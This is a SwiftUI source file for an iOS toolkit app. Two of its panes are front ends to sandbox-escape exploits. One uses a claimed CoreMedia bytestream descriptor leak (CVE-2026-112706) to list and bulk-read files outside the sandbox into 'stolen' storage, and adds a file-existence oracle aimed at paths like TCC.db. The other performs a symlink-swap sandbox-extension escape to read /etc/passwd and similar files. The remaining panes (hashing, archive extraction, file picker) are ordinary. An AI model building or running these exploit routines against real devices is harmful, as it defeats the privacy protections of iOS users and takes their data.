import SwiftUI
import UniformTypeIdentifiers

// MARK: - Toolkit hub

struct ModView: View {
    @State private var pane = 0

    private var panes: [(String, String)] {
        [
            (t("pane.files"), "folder.fill"),
            (t("pane.cross"), "arrow.left.arrow.right"),
            (t("pane.symlink"), "link.badge.plus"),
            (t("pane.apps"), "app.fill"),
            (t("pane.prefs"), "slider.horizontal.3"),
            (t("pane.procs"), "list.bullet.rectangle"),
            (t("pane.daemons"), "gearshape.2.fill"),
            (t("pane.crashes"), "exclamationmark.triangle.fill"),
            (t("pane.binary"), "cpu"),
            (t("pane.hex"), "number"),
            (t("pane.xattr"), "tag.fill"),
            (t("pane.sqlite"), "cylinder.split.1x2"),
            (t("pane.archive"), "shippingbox.fill"),
            (t("pane.hash"), "number.square.fill"),
            (t("pane.fonts"), "textformat"),
            (t("pane.ipa"), "wand.and.stars"),
            (t("pane.backup"), "archivebox.fill"),
            (t("pane.telemetry"), "gauge.medium"),
            (t("pane.profiles"), "checkmark.seal.fill"),
        ]
    }

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 7) {
                        ForEach(Array(panes.enumerated()), id: \.offset) { i, entry in
                            Button { pane = i } label: {
                                HStack(spacing: 4) {
                                    Image(systemName: entry.1).font(.system(size: 9, weight: .semibold))
                                    Text(entry.0)
                                }
                                .font(T.tiny)
                                .foregroundColor(pane == i ? T.ember : .white.opacity(0.45))
                                .padding(.horizontal, 8).padding(.vertical, 4)
                                .background(Capsule().fill(pane == i ? T.ember.opacity(0.14) : Color.clear))
                                .overlay(Capsule().strokeBorder(pane == i ? T.ember.opacity(0.35) : T.stroke, lineWidth: 0.6))
                            }
                        }
                    }
                    .padding(.horizontal, 16)
                    .padding(.vertical, 9)
                }

                switch pane {
                case 0: FilesPane()
                case 1: CrossSandboxPane()
                case 2: SymlinkPane()
                case 3: AppsPane()
                case 4: PrefsPane()
                case 5: ProcessPane()
                case 6: DaemonPane()
                case 7: CrashPane()
                case 8: BinaryPane()
                case 9: HexPane()
                case 10: XattrPane()
                case 11: SQLitePane()
                case 12: ArchivePane()
                case 13: HashPane()
                case 14: FontPane()
                case 15: IPAPane()
                case 16: BackupPane()
                case 17: TelemetryPane()
                default: ProfilePane()
                }
            }
            .background(T.bg.ignoresSafeArea())
            .navigationTitle(t("mod.title"))
            .navigationBarTitleDisplayMode(.inline)
        }
    }
}

// MARK: - Cross-sandbox reader (CVE-2026-112706)

struct CrossSandboxPane: View {
    @State private var entries: [String] = []
    @State private var listing = false
    @State private var status = ""
    @State private var handshake: [String] = []
    @State private var stolen: [(name: String, bytes: Int, url: URL?)] = []
    @State private var previews: [String: String] = [:]
    @State private var path = FdLeak.readableDomain
    @State private var oraclePath = ""
    @State private var oracleResult = ""
    @State private var busy = false

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                Card {
                    VStack(alignment: .leading, spacing: 9) {
                        HStack {
                            SectionLabel(text: "CoreMedia bytestream")
                            Spacer()
                            Pill(text: "CVE-2026-112706", color: T.violet)
                        }
                        Text(tl("mediaplaybackd.bytestream.xpc 对任何沙盒应用可达。守护进程以自身凭据打开客户端指定的绝对路径，并把活描述符放进回复的 ByteStreamDetails。描述符级 I/O 不受客户端沙盒的路径检查约束 —— 应用自身 open() 返回 EPERM 的文件，其内容可经该描述符完整读回。"))
                            .font(T.body).foregroundColor(.white.opacity(0.66))
                            .fixedSize(horizontal: false, vertical: true)
                        if !handshake.isEmpty {
                            VStack(alignment: .leading, spacing: 1) {
                                ForEach(Array(handshake.enumerated()), id: \.offset) { _, line in
                                    Text(line).font(T.monoSm).foregroundColor(.white.opacity(0.4))
                                }
                            }
                        }
                        HStack(spacing: 8) {
                            RunButton(title: listing ? "…" : tl("枚举目录"), systemImage: "list.bullet",
                                      tint: T.violet, disabled: busy) { listDirectory() }
                            RunButton(title: busy ? "…" : tl("全部读取"), systemImage: "arrow.down.doc",
                                      tint: T.ember, disabled: busy) { stealAll() }
                        }
                        if !status.isEmpty {
                            Text(status).font(T.monoSm).foregroundColor(.white.opacity(0.6))
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                }

                Card {
                    VStack(alignment: .leading, spacing: 8) {
                        SectionLabel(text: tl("路径"))
                        TextField(FdLeak.readableDomain, text: $path)
                            .font(T.monoSm)
                            .textInputAutocapitalization(.never)
                            .autocorrectionDisabled()
                            .padding(8)
                            .background(RoundedRectangle(cornerRadius: 8).fill(T.panelHi))
                        ForEach(Array(entries.enumerated()), id: \.offset) { _, name in
                            HStack(spacing: 7) {
                                Image(systemName: "doc").font(.system(size: 10))
                                    .foregroundColor(.white.opacity(0.35))
                                Text(name).font(T.monoSm)
                                    .foregroundColor(.white.opacity(0.72)).lineLimit(1)
                                Spacer()
                                Button {
                                    readOne(name)
                                } label: {
                                    Image(systemName: "arrow.down.circle").font(.system(size: 12))
                                }.tint(T.ember)
                            }
                        }
                    }
                }

                if !oracleResult.isEmpty {
                    Card {
                        Text(oracleResult).font(T.monoSm).foregroundColor(.white.opacity(0.7))
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .fixedSize(horizontal: false, vertical: true)
                    }
                }

                Card {
                    VStack(alignment: .leading, spacing: 8) {
                        SectionLabel(text: tl("存在性预言机"))
                        Text(tl("真实但被拒的路径返回 -12203，不存在的路径返回 -17913。两个不同的服务端错误码在不授予访问的前提下披露文件是否存在。"))
                            .font(T.tiny).foregroundColor(.white.opacity(0.35))
                            .fixedSize(horizontal: false, vertical: true)
                        TextField("/private/var/mobile/Library/TCC/TCC.db", text: $oraclePath)
                            .font(T.monoSm)
                            .textInputAutocapitalization(.never)
                            .autocorrectionDisabled()
                            .padding(8)
                            .background(RoundedRectangle(cornerRadius: 8).fill(T.panelHi))
                        RunButton(title: tl("探测"), systemImage: "questionmark.circle", tint: T.info,
                                  disabled: busy || oraclePath.isEmpty) { probeOracle() }
                    }
                }

                if !stolen.isEmpty {
                    Card {
                        VStack(alignment: .leading, spacing: 8) {
                            SectionLabel(text: tl("已取回"))
                            ForEach(Array(stolen.enumerated()), id: \.offset) { _, item in
                                VStack(alignment: .leading, spacing: 2) {
                                    HStack {
                                        Text(item.name).font(T.monoSm).foregroundColor(T.good)
                                        Spacer()
                                        Text("\(item.bytes) B").font(T.monoSm).foregroundColor(.white.opacity(0.3))
                                    }
                                    if let preview = previews[item.name] {
                                        Text(preview).font(T.monoSm)
                                            .foregroundColor(.white.opacity(0.4)).lineLimit(2)
                                    }
                                }
                            }
                        }
                    }
                }
            }
            .padding(16)
        }
    }

    private func session(_ body: @escaping (FdLeak.Session) -> Void) {
        busy = true
        DispatchQueue.global(qos: .userInitiated).async {
            guard let s = FdLeak.Session() else {
                DispatchQueue.main.async { busy = false; status = tl("会话建立失败") }
                return
            }
            let log = s.handshakeLog
            body(s)
            s.shutdown()
            DispatchQueue.main.async { handshake = log; busy = false }
        }
    }

    private func listDirectory() {
        session { s in
            let result = s.list(path)
            DispatchQueue.main.async {
                entries = result.entries
                status = "\(result.entries.count)" + tl(" 个条目 · mode ") + "\(String(result.vend.mode, radix: 8))"
            }
        }
    }

    private func readOne(_ name: String) {
        let full = path.hasSuffix("/") ? path + name : path + "/" + name
        session { s in
            let (data, vend) = s.read(full)
            DispatchQueue.main.async {
                guard let data = data else {
                    status = tl("读取失败: ") + "\(vend.note)"
                    return
                }
                let url = try? Container.write(data, to: Container.work.appendingPathComponent("x_\(name)").path)
                stolen.append((name, data.count, url))
                previews[name] = String(data: data.prefix(120), encoding: .utf8)?
                    .replacingOccurrences(of: "\n", with: "\\n")
                    ?? data.prefix(24).map { String(format: "%02x", $0) }.joined()
                status = "✓ \(name) \(data.count) B"
            }
        }
    }

    private func stealAll() {
        session { s in
            var results: [(String, Int, URL?)] = []
            var heads: [String: String] = [:]
            for (label, target) in FdLeak.knownTargets {
                let (data, _) = s.read(target)
                guard let data = data else { continue }
                let url = try? Container.write(data, to: Container.work.appendingPathComponent("x_\(label)").path)
                results.append((label, data.count, url))
                heads[label] = String(data: data.prefix(120), encoding: .utf8)?
                    .replacingOccurrences(of: "\n", with: "\\n")
                    ?? data.prefix(24).map { String(format: "%02x", $0) }.joined()
            }
            DispatchQueue.main.async {
                stolen = results
                previews = heads
                status = results.isEmpty ? tl("未取到数据") : tl("✓ ") + "\(results.count)" + tl(" 个文件")
            }
        }
    }

    private func probeOracle() {
        session { s in
            let e = s.probeExistence(oraclePath)
            let text: String
            switch e.code {
            case 0: text = tl("可开（code 0）")
            case FdLeak.errAccessDenied: text = tl("存在但被拒 (-12203)")
            case FdLeak.errNoSuchFile: text = tl("不存在 (-17913)")
            default: text = tl("错误码 ") + "\(e.code)"
            }
            DispatchQueue.main.async {
                oracleResult = "\(text)\n\(oraclePath)"
            }
        }
    }
}

// MARK: - Symlink escape

struct SymlinkPane: View {
    @State private var target = "/etc/passwd"
    @State private var result = ""
    @State private var output = ""
    @State private var busy = false
    @State private var history: [(String, Int, Bool)] = []

    private let presets = ["/etc/passwd", "/etc/group", "/etc/hosts", "/etc/services",
                           "/var/preferences/com.apple.networkd.plist"]

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                Card {
                    VStack(alignment: .leading, spacing: 9) {
                        HStack {
                            SectionLabel(text: "sandbox_extension TOCTOU")
                            Spacer()
                            Pill(text: tl("未修复"), color: T.ember)
                        }
                        Text(tl("sandbox_extension_issue_file 在签发时解析符号链接，但不强制 SANDBOX_EXTENSION_NOFOLLOW。签发返回的令牌绑定签发时刻解析出的目标，而内核对消费时刻所用路径不做复核。序列为：沙盒内建立链接 L 指向沙盒内文件 S → 对 L 签发扩展 → 将 L 重指向沙盒外目标 T → 消费令牌后经 L 读取。"))
                            .font(T.body).foregroundColor(.white.opacity(0.66))
                            .fixedSize(horizontal: false, vertical: true)
                        Text(tl("该序列确定性成立，不需要竞态窗口。Apple 未将其视为安全问题，因此没有 CVE 编号。"))
                            .font(T.tiny).foregroundColor(.white.opacity(0.35))
                            .fixedSize(horizontal: false, vertical: true)
                    }
                }

                Card {
                    VStack(alignment: .leading, spacing: 8) {
                        SectionLabel(text: tl("目标"))
                        TextField("/etc/passwd", text: $target)
                            .font(T.monoSm)
                            .textInputAutocapitalization(.never)
                            .autocorrectionDisabled()
                            .padding(8)
                            .background(RoundedRectangle(cornerRadius: 8).fill(T.panelHi))
                        ScrollView(.horizontal, showsIndicators: false) {
                            HStack(spacing: 6) {
                                ForEach(presets, id: \.self) { p in
                                    Button { target = p } label: {
                                        Pill(text: (p as NSString).lastPathComponent, color: .white.opacity(0.45))
                                    }
                                }
                            }
                        }
                        RunButton(title: busy ? "…" : tl("越过沙盒读取"),
                                  systemImage: "link.badge.plus", tint: T.ember, disabled: busy) { run() }
                    }
                }

                if !result.isEmpty {
                    Card {
                        Text(result).font(T.monoSm).foregroundColor(.white.opacity(0.7))
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .fixedSize(horizontal: false, vertical: true)
                    }
                }

                if !output.isEmpty {
                    Card {
                        VStack(alignment: .leading, spacing: 4) {
                            SectionLabel(text: tl("内容"))
                            Text(output)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundColor(.white.opacity(0.72))
                                .textSelection(.enabled)
                                .frame(maxWidth: .infinity, alignment: .leading)
                        }
                    }
                }

                if !history.isEmpty {
                    Card {
                        VStack(alignment: .leading, spacing: 4) {
                            SectionLabel(text: tl("记录"))
                            ForEach(Array(history.enumerated()), id: \.offset) { _, row in
                                HStack {
                                    Image(systemName: row.2 ? "checkmark.circle.fill" : "xmark.circle")
                                        .font(.system(size: 9))
                                        .foregroundColor(row.2 ? T.good : .white.opacity(0.25))
                                    Text(row.0).font(T.monoSm).foregroundColor(.white.opacity(0.6)).lineLimit(1)
                                    Spacer()
                                    Text("\(row.1) B").font(T.monoSm).foregroundColor(.white.opacity(0.3))
                                }
                            }
                        }
                    }
                }
            }
            .padding(16)
        }
    }

    private func run() {
        busy = true
        let t = target
        DispatchQueue.global(qos: .userInitiated).async {
            let link = Container.work.appendingPathComponent("sbx_link")
            let decoy = Container.work.appendingPathComponent("sbx_decoy")
            let r = SandboxExtension.readThroughSwap(target: t, link: link, decoy: decoy)
            let direct = SandboxExtension.directRead(t)
            DispatchQueue.main.async {
                busy = false
                result = [
                    tl("目标      ") + "\(t)",
                    tl("签发      ") + "\(r.issued ? tl("成功") : tl("失败"))",
                    tl("消费      ") + "\(r.consumed ? tl("成功") : tl("失败"))",
                    tl("读取      ") + "\(r.bytes)" + tl(" B"),
                    tl("对照      直接读 ") + (direct.errno != 0
                        ? "errno=\(direct.errno) (\(String(cString: strerror(direct.errno))))"
                        : "\(direct.bytes) B"),
                    r.note,
                ].joined(separator: "\n")
                if let data = r.data, let text = String(data: data.prefix(4000), encoding: .utf8) {
                    output = text
                } else if let data = r.data {
                    output = data.prefix(512).map { String(format: "%02x", $0) }.joined()
                } else {
                    output = ""
                }
                history.append((t, r.bytes, r.ok))
            }
        }
    }
}

// MARK: - Hash

struct HashPane: View {
    @State private var target: URL?
    @State private var picking = false
    @State private var results: [(String, String)] = []
    @State private var busy = false

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                Card {
                    VStack(alignment: .leading, spacing: 10) {
                        SectionLabel(text: t("pane.hash"))
                        Button { picking = true } label: {
                            HStack(spacing: 8) {
                                Image(systemName: "number.square.fill").font(.system(size: 12))
                                Text(target?.lastPathComponent ?? t("files.select")).font(T.body)
                                Spacer()
                                Image(systemName: "chevron.right").font(.system(size: 10, weight: .bold))
                            }
                            .foregroundColor(target == nil ? .white.opacity(0.4) : T.ember)
                            .padding(10)
                            .background(RoundedRectangle(cornerRadius: 9).fill(T.panelHi))
                        }
                        if busy { ProgressView().scaleEffect(0.7) }
                    }
                }
                if !results.isEmpty {
                    Card {
                        VStack(alignment: .leading, spacing: 6) {
                            ForEach(Array(results.enumerated()), id: \.offset) { _, row in
                                VStack(alignment: .leading, spacing: 1) {
                                    Text(row.0).font(T.tiny).foregroundColor(.white.opacity(0.35))
                                    Text(row.1).font(T.monoSm).foregroundColor(T.good)
                                        .textSelection(.enabled)
                                        .fixedSize(horizontal: false, vertical: true)
                                }
                            }
                        }
                    }
                }
            }
            .padding(16)
        }
        .sheet(isPresented: $picking) {
            FilePickerSheet(isPresented: $picking) { url in
                target = url
                compute(url)
            }
        }
    }

    private func compute(_ url: URL) {
        busy = true
        results = []
        DispatchQueue.global(qos: .userInitiated).async {
            guard let data = try? Data(contentsOf: url) else {
                DispatchQueue.main.async { busy = false }
                return
            }
            var out: [(String, String)] = [(tl("大小"), "\(data.count) B")]
            out.append(("CRC32", String(format: "%08x", ZipWriter.crc32([UInt8](data)))))
            out.append(("SHA-256", data.sha256Hex))
            out.append(("SHA-1", data.sha1Hex))
            out.append(("MD5", data.md5Hex))
            DispatchQueue.main.async {
                results = out
                busy = false
            }
        }
    }
}

// MARK: - Archive

struct ArchivePane: View {
    @State private var target: URL?
    @State private var picking = false
    @State private var entries: [PackageEntry] = []
    @State private var status = ""
    @State private var extractTo: String = Container.work.path

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                Card {
                    VStack(alignment: .leading, spacing: 10) {
                        SectionLabel(text: t("pane.archive"))
                        Button { picking = true } label: {
                            HStack(spacing: 8) {
                                Image(systemName: "shippingbox.fill").font(.system(size: 12))
                                Text(target?.lastPathComponent ?? t("files.select")).font(T.body)
                                Spacer()
                                Image(systemName: "chevron.right").font(.system(size: 10, weight: .bold))
                            }
                            .foregroundColor(target == nil ? .white.opacity(0.4) : T.ember)
                            .padding(10)
                            .background(RoundedRectangle(cornerRadius: 9).fill(T.panelHi))
                        }
                        TextField(t("files.path"), text: $extractTo)
                            .font(T.monoSm)
                            .textInputAutocapitalization(.never)
                            .autocorrectionDisabled()
                            .padding(8)
                            .background(RoundedRectangle(cornerRadius: 8).fill(T.panelHi))
                        RunButton(title: tl("解包"), systemImage: "arrow.down.doc", tint: T.info,
                                  disabled: target == nil) { extract() }
                        if !status.isEmpty {
                            Text(status).font(T.monoSm).foregroundColor(.white.opacity(0.6))
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                }

                if !entries.isEmpty {
                    Card {
                        VStack(alignment: .leading, spacing: 3) {
                            SectionLabel(text: tl("内容 (") + "\(entries.count)" + tl(")"))
                            ForEach(entries.prefix(400)) { e in
                                HStack {
                                    Text(e.name).font(T.monoSm)
                                        .foregroundColor(.white.opacity(0.65)).lineLimit(1)
                                    Spacer()
                                    Text("\(e.size) B").font(T.monoSm).foregroundColor(.white.opacity(0.25))
                                }
                            }
                        }
                    }
                }
            }
            .padding(16)
        }
        .sheet(isPresented: $picking) {
            FilePickerSheet(isPresented: $picking) { url in
                target = url
                entries = PackageTool.list(url.path)
                status = "\(entries.count)" + tl(" 个条目")
            }
        }
    }

    private func extract() {
        guard let target = target else { return }
        status = PackageTool.extract(target.path, to: URL(fileURLWithPath: extractTo))
    }
}

// MARK: - File picker

struct FilePickerSheet: View {
    @Binding var isPresented: Bool
    let onPick: (URL) -> Void

    @State private var browser = FileBrowser(path: Container.documents.path)
    @State private var jump = ""

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                HStack(spacing: 8) {
                    Button { browser.up() } label: {
                        Image(systemName: "arrow.up").font(.system(size: 12, weight: .bold))
                    }.tint(T.ember)
                    TextField(t("files.path"), text: $jump)
                        .font(T.monoSm)
                        .textInputAutocapitalization(.never)
                        .autocorrectionDisabled()
                        .onSubmit { browser.chdir(jump) }
                        .padding(7)
                        .background(RoundedRectangle(cornerRadius: 7).fill(T.panel))
                    Button { browser.chdir(jump) } label: {
                        Image(systemName: "arrow.right.to.line").font(.system(size: 11, weight: .bold))
                    }.tint(T.ember)
                }
                .padding(.horizontal, 16).padding(.vertical, 8)

                Text(browser.path)
                    .font(T.monoSm).foregroundColor(.white.opacity(0.3))
                    .lineLimit(1).truncationMode(.head)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(.horizontal, 16).padding(.bottom, 6)

                List {
                    ForEach(browser.items) { item in
                        Button {
                            if item.isDirectory {
                                browser.enter(item)
                                jump = item.path
                            } else {
                                onPick(URL(fileURLWithPath: item.path))
                                isPresented = false
                            }
                        } label: {
                            HStack(spacing: 10) {
                                Image(systemName: item.icon).font(.system(size: 12))
                                    .foregroundColor(item.isDirectory ? T.ember : .white.opacity(0.4))
                                    .frame(width: 18)
                                Text(item.name).font(T.body).foregroundColor(.white.opacity(0.85)).lineLimit(1)
                                Spacer()
                                if !item.isDirectory {
                                    Text(item.displaySize).font(T.monoSm).foregroundColor(.white.opacity(0.25))
                                }
                            }
                        }
                        .listRowBackground(T.panel)
                    }
                }
                .listStyle(.plain)
                .scrollContentBackground(.hidden)
            }
            .background(T.bg.ignoresSafeArea())
            .navigationTitle(t("files.select"))
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .topBarTrailing) {
                    Button(t("files.cancel")) { isPresented = false }.tint(T.ember)
                }
            }
            .onAppear { jump = browser.path }
        }
    }
}
